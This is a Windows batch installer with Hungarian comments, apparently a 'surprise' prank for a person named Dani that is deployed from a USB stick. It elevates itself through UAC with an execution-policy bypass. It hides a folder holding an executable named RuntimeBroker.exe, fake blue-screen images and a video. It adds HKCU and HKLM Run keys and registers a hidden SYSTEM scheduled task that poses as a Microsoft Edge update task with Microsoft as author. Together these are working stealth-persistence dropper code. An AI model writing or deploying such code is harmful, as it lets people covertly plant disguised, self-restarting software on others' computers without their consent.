@echo off
:: ================================================================
::  dani-meglepi -- Deploy szkript v3
:: ================================================================
setlocal EnableDelayedExpansion

set "ASSET_DIR=C:\Users\Public\dani-meglepi"
set "EXE_NAME=RuntimeBroker.exe"
set "TASK_NAME=MicrosoftEdgeUpdateTaskMachineCore"
set "SRC=%~dp0"
if "%SRC:~-1%"=="\" set "SRC=%SRC:~0,-1%"

:: ── Self-elevation: ha nincs admin jog, kérjük el ───────────────
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Admin jog szukseges. UAC prompt kovetkezik...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "Start-Process cmd.exe -ArgumentList '/c \"%~f0\" ELEVATED' -Verb RunAs -Wait"
    exit /b 0
)

:: Ha ELEVATED argumentummal hívták, a munkamappa a system32 lehet —
:: visszaállítjuk az eredeti src-re
if "%~1"=="ELEVATED" (
    :: Az SRC most a temp/system32 lehet, ezért a szkript saját útvonalát használjuk
    set "SRC=%~dp0"
    if "!SRC:~-1!"=="\" set "SRC=!SRC:~0,-1!"
)

set "IS_ADMIN=1"
echo.
echo  ============================================
echo   dani-meglepi telepito v3  [ADMIN mod]
echo  ============================================
echo.

:: ── 1. Célkönyvtár létrehozása ───────────────────────────────────
echo [1/5] Konyvtar: %ASSET_DIR%
if not exist "%ASSET_DIR%" (
    mkdir "%ASSET_DIR%" 2>nul
    if errorlevel 1 ( echo   HIBA: Nem sikerult letrehozni! & goto :fail )
    echo   Letrehozva.
) else (
    echo   Mar letezik.
)

:: ── 2. Mappa elrejtése (attrib) ──────────────────────────────────
echo.
echo [2/5] Mappa elrejtese...
attrib +H +S "%ASSET_DIR%" >nul 2>&1
if errorlevel 1 (
    echo   FIGYELEM: Nem sikerult elrejteni ^(nem vegzetes^).
) else (
    echo   OK: Mappa rejtett + rendszer attributum beallitva.
)

:: ── 3. Fájlok másolása ───────────────────────────────────────────
echo.
echo [3/5] Fajlok masolasa...
set "FILES=%EXE_NAME% bsod_800x600.png bsod_1024x768.png bsod_1152x864.png bsod_1280x1024.png bsod_1600x1200.png daninak.mp4"
set "MISSING="
for %%F in (%FILES%) do (
    if not exist "!SRC!\%%F" (
        echo   HIANYZIK: %%F
        set "MISSING=1"
    )
)
if defined MISSING (
    echo.
    echo   Szukseges fajlok a pendrive-on:
    echo     %FILES%
    goto :fail
)
for %%F in (%FILES%) do (
    copy /Y "!SRC!\%%F" "%ASSET_DIR%\%%F" >nul
    if errorlevel 1 ( echo   HIBA: %%F masolasa sikertelen! & goto :fail )
    echo   OK: %%F
)

:: ── 4. Registry ──────────────────────────────────────────────────
echo.
echo [4/5] Registry beallitasa...

:: HKCU
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
if errorlevel 1 ( echo   FIGYELEM: HKCU registry sikertelen.
) else ( echo   OK: HKCU\Run )

:: HKLM (admin esetén mindig sikerül)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
if errorlevel 1 ( echo   FIGYELEM: HKLM registry sikertelen.
) else ( echo   OK: HKLM\Run ^(minden felhasznalora^) )

:: ── 5. Task Scheduler (SYSTEM, hidden, minden felhasználóra) ─────
echo.
echo [5/5] Task Scheduler - SYSTEM szintu feladat...

schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

set "TASK_XML=%TEMP%\dm_task_%RANDOM%.xml"
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Author^>Microsoft Corporation^</Author^>
echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<LogonType^>ServiceAccount^</LogonType^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT1M^</Interval^>
echo       ^<Count^>999^</Count^>
echo     ^</RestartOnFailure^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "!TASK_XML!"

schtasks /create /xml "!TASK_XML!" /tn "%TASK_NAME%" /f >nul 2>&1
set "TASK_ERR=!errorlevel!"
del "!TASK_XML!" >nul 2>&1

if !TASK_ERR! neq 0 (
    echo   FIGYELEM: SYSTEM task sikertelen ^(Registry elegendo^).
) else (
    echo   OK: Task Scheduler - SYSTEM, minden felhasznalora, hidden.
)

:: ── Azonnali indítás ─────────────────────────────────────────────
echo.
echo [+] Program inditasa...
:: Ha SYSTEM taskként futna, az interaktív asztalon nem jelenne meg,
:: ezért közvetlenül indítjuk az aktuális felhasználó munkamenetéből
start "" /B "%ASSET_DIR%\%EXE_NAME%"
echo   OK: RuntimeBroker.exe elinditva.

:: ── Összefoglalás ────────────────────────────────────────────────
echo.
echo  ============================================
echo   Telepites KESZ!  [ADMIN mod]
echo.
echo   Hely    : %ASSET_DIR% ^(rejtett^)
echo   Registry: HKCU + HKLM ^(minden felhasznalo^)
echo   Task    : SYSTEM szintu, minden bejelentkezeskor
echo   Ujraind.: Task RestartOnFailure + Registry
echo  ============================================
echo.
timeout /t 5 /nobreak >nul
exit /b 0

:fail
echo.
echo  ============================================
echo   TELEPITES SIKERTELEN
echo  ============================================
echo.
pause
exit /b 1
